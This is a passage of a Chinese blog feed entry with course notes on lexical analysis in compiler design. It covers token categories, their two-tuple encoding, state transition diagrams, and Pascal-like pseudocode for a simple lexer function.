单词的种类</h3><ol><li>标识符：用来命名程序中的实体，如类型、变量、函数、过程、标号等</li><li>基本字（关键字）：如if、while等</li><li>常量：各种类型的常量</li><li>运算符：如+、-、*、/等</li><li>（分）界符：如；、{、}等</li></ol><p>eg：</p><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429084743808.png" alt="image-20210429084743808" /></p><blockquote><p>留意最后的换行符‘\n’也是界符</p></blockquote><h3 id="22-单词的输出形式"><a class="markdownIt-Anchor" href="#22-单词的输出形式"></a> 2.2 单词的输出形式</h3><p>使用二元式表示：</p><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429084945101.png" alt="image-20210429084945101" /></p><h2 id="3-单词类别的划分"><a class="markdownIt-Anchor" href="#3-单词类别的划分"></a> 3. 单词类别的划分</h2><h3 id="31-单词的编码随类别不同而不同"><a class="markdownIt-Anchor" href="#31-单词的编码随类别不同而不同"></a> 3.1 单词的编码随类别不同而不同</h3><ol><li><strong>基本字、运算符、界符</strong>的数目是确定的，每个单词与它的类别码为一一对应的关系，即<strong>一字一码</strong>，故而它们的第二元可以空缺</li><li><strong>标识符</strong>通归一类</li><li><strong>常量</strong>可按整型、实型、字符型、布尔型等分类</li></ol><p>eg：</p><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429085538808.png" alt="image-20210429085538808" /></p><blockquote><p>通常用常数在常量表（标识符在符号表）中的位置（编号）作为它们的属性值</p></blockquote><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429085737912.png" alt="image-20210429085737912" /></p><h3 id="32-单词的识别方法"><a class="markdownIt-Anchor" href="#32-单词的识别方法"></a> 3.2 单词的识别方法</h3><ol><li><p>标识符和关键字的识别</p><blockquote><p>需要<strong>超前搜索</strong>（多读一个字符以确认上一个结束）</p><p>读到 非 字母数字停止</p></blockquote></li><li><p>常数的识别</p><blockquote><p>部分常量需要超前搜索</p></blockquote></li><li><p>运算符的识别</p><blockquote><p>1个或多个符号构成</p><p>需要超前搜索</p></blockquote></li><li><p>界符的识别</p><blockquote><p>不需要超前搜索</p></blockquote></li></ol><h2 id="4-状态转换图"><a class="markdownIt-Anchor" href="#4-状态转换图"></a> 4. 状态转换图</h2><p>状态转换图是设计词法分析器的有效工具</p><p>状态图特点：</p><ol><li>有限的有向图</li><li>有向边上标记字符</li><li>唯一初态</li><li>若干终态（至少一个）</li></ol><p>图示：</p><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429090825221.png" alt="image-20210429090825221" /></p><p>eg：</p><p>识别标识符和数字串的状态转换图：</p><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429091210263.png" alt="image-20210429091210263" /></p><p>它的流程图：</p><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429091340527.png" alt="image-20210429091340527" /></p><h2 id="5-词法分析器的设计"><a class="markdownIt-Anchor" href="#5-词法分析器的设计"></a> 5. 词法分析器的设计</h2><h3 id="51-单词符号"><a class="markdownIt-Anchor" href="#51-单词符号"></a> 5.1 单词符号</h3><p>标识符：begin、end、integer、if、then、else、function、read、write</p><p>无符号整型常量</p><p>运算符：-、*、&lt;、&lt;=、&lt;&gt;、=、&gt;、&gt;=、:=</p><p>分界符：；、（、）、</p><h3 id="52-状态转换图"><a class="markdownIt-Anchor" href="#52-状态转换图"></a> 5.2 状态转换图</h3><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429091724175.png" alt="image-20210429091724175" /></p><p><img src="/images/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E7%AC%AC%E5%85%AD%E7%AB%A0/image-20210429091752010.png" alt="image-20210429091752010" /></p><blockquote><p>注意：有*标记的状态需要回退一个字符</p></blockquote><h3 id="53-一个示意算法"><a class="markdownIt-Anchor" href="#53-一个示意算法"></a> 5.3 一个示意算法</h3><p>以下是将会用到的变量、函数和过程</p><ol><li><p>cha</p><blockquote><p>字符变量，存放最新读入的字符</p></blockquote></li><li><p>token</p><blockquote><p>字符数组，存放已读入的字符序列</p></blockquote></li><li><p>getchar（）</p><blockquote><p>读入字符的过程，从输入字符串（源程序文件）中读入一个字符到变量cha中</p></blockquote></li><li><p>getnbc（）</p><blockquote><p>读入非空白字符的函数</p></blockquote></li><li><p>concat（）</p><blockquote><p>连接字符的过程，把cha中的字符连接到token数组的末尾</p></blockquote></li><li><p>letter（）</p><blockquote><p>判断字符是否为字母的函数，若cha中的字符是字母，返回true，否则返回false</p></blockquote></li><li><p>digit（）</p><blockquote><p>判断字符是否为数字的函数，同上</p></blockquote></li><li><p>retract（）</p><blockquote><p>回退字符的过程，将刚读入cha中的字符回退到输入字符串中，并将cha的值置为空白</p><p>实现方法：不需要真正回退，可以设置标记位。</p></blockquote></li><li><p>reserve（）</p><blockquote><p>处理保留字的函数，对存放在token中的字符串差保留字表，查到返回该保留字的类别编码，否则返回0（假定0不是任何单词符号的类别编码）</p></blockquote></li><li><p>bulidlist（）</p><blockquote><p>对token中的字符串查符号表，查到返回位置编号，否则将该串存入符号表，并返回它在符号表中的位置编号</p></blockquote></li><li><p>dtb（）</p><blockquote><p>将token中的数字串（字符串）转换成二进制，存入常数表中，并返回它在符号表中的位置编号。若已经存在，则直接返回它在表中的编号</p></blockquote></li><li><p>return（num，value）</p><blockquote><p>返回二元式函数，num为单词类别编码，value是单词在符号表中的位置编号，或是它在常数表中的位置编号，或是0</p></blockquote></li><li><p>error（）</p><blockquote><p>处理出现词法错误的过程。有一类词法错误可以在词法分析时发现，如出现字母表以外的非法字符。不和规则的常数等。但有一类词法错误例如if写成fi，词法分析会将fi当标识符处理，length中多了个空格，词法分析会将le和ngth当作两个标识符处理，这类错误要推迟到语法分析时才能发现，当作语法错误处理</p></blockquote></li></ol><p>伪代码：</p><figure class="highlight pascal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">Word_Struct LexAnalyze()</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">   start:  token:=‘’ ;</span><br><span class="line">              getchar();</span><br><span class="line">              getnb();</span><br><span class="line">              <span class="keyword">case</span> cha <span class="keyword">of</span> </span><br><span class="line">                ‘a’…‘z’:  <span class="keyword">begin</span> </span><br><span class="line">                  <span class="keyword">while</span> letter() <span class="keyword">or</span> digit() <span class="keyword">do</span></span><br><span class="line">                     <span class="keyword">begin</span> concat ();getchar() <span class="keyword">end</span>;</span><br><span class="line">                     retract(); c:= reserve();</span><br><span class="line">                     <span class="keyword">if</span> c = <span class="number">0</span> <span class="keyword">then</span> <span class="keyword">begin</span></span><br><span class="line">                        val:= buildlist(); return($ID,val)    end</span><br><span class="line">                    <span class="keyword">else</span> return(c,<span class="number">0</span>)</span><br><span class="line">                 <span class="keyword">end</span>;</span><br><span class="line">                ‘<span class="number">0</span>’…‘<span class="number">9</span>’:  <span class="keyword">begin</span></span><br><span class="line">                 <span class="keyword">while</span> digit() <span class="keyword">do</span></span><br><span class="line">                   <span class="keyword">begin</span> concat();getchar() <span class="keyword">end</span>;</span><br><span class="line">                 retract(); val:=dtb();</span><br><span class="line">                 return($INT,val)</span><br><span class="line">                 <span class="keyword">end</span>;</span><br><span class="line">                ‘ = ’:   return(<span class="number">$E</span>Q,<span class="number">0</span>);</span><br><span class="line">                ‘ - ’:    return($SUB,0); </span><br><span class="line">                ‘ * ’:   return($MUL,0);</span><br><span class="line">                ‘ ( ’:    return($LPAR,0);</span><br><span class="line">                ‘ ) ’:    return($RPAR,0);</span><br><span class="line">                ‘ ; ’:    return($SEM,0)</span><br><span class="line">                ‘ &lt; ’:   <span class="keyword">begin</span></span><br><span class="line">                  getchar();</span><br><span class="line">                  if cha = ‘=’ then return($LE, 0)</span><br><span class="line">                  <span class="keyword">else</span> </span><br><span class="line">                    if cha = ‘&gt;’ then return($NE, 0);</span><br><span class="line">                  retract();  return($LT,0)</span><br><span class="line">                <span class="keyword">end</span>;</span><br><span class="line">                ‘ &gt; ’:   <span class="keyword">begin</span></span><br><span class="line">                  getchar();</span><br><span class="line">                  if cha= ‘ = ’ then return($GE, 0);</span><br><span class="line">                  retract();</span><br><span class="line">                  return($GT, 0)</span><br><span class="line">                <span class="keyword">end</span>;</span><br><span class="line">                ‘ : ’:    <span class="keyword">begin</span></span><br><span class="line">                  getchar();</span><br><span class="line">                  <span class="keyword">if</span> cha = ‘ = ‘ <span class="keyword">then</span>   </span><br><span class="line">                      return(<span class="number">$A</span>SSIGN,<span class="number">0</span>)</span><br><span class="line">                  <span class="keyword">else</span> error(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">end</span>;</span><br><span class="line">                other: error(<span class="number">2</span>)</span><br><span class="line">                <span class="keyword">end</span> <span class="keyword">of</span> <span class="keyword">case</span>;</span><br><span class="line"><span class="keyword">End</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>以上代码将词法分析器实现为一个函数LexAnalyze()，函数没执行一次，就会从输入字符串中识别出一个单词符号并按二元式形式返回。</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;编译原理第六章-词法分析&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#编译原理第六章-词法分析&quot;&gt;&lt;/a&gt; 编译原理第六章-词法分析&lt;/h1&gt;
&lt;p&gt;词法分析：编译程序对源程序进行分析和目标程序合成，最终生成目标程序&lt;/p&gt;
&lt;p&gt;预处理子程序（预处理器）功能：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;删除编辑用字符，如制表符、换页符等&lt;/li&gt;
&lt;li&gt;删除注释&lt;/li&gt;
&lt;li&gt;合并多个空白字符为单个空白字符&lt;/li&gt;
&lt;li&gt;组合多个独立文件中的源程序&lt;/li&gt;
&lt;li&gt;展开宏定义&lt;/li&gt;
&lt;li&gt;条件编译的选择等&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="编译原理" scheme="https://wsw8.online/categories/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="课程" scheme="https://wsw8.online/tags/%E8%AF%BE%E7%A8%8B/"/>
    
    <category term="计算机" scheme="https://wsw8.online/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
    <category term="编译原理" scheme="https://wsw8.online/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
</feed>
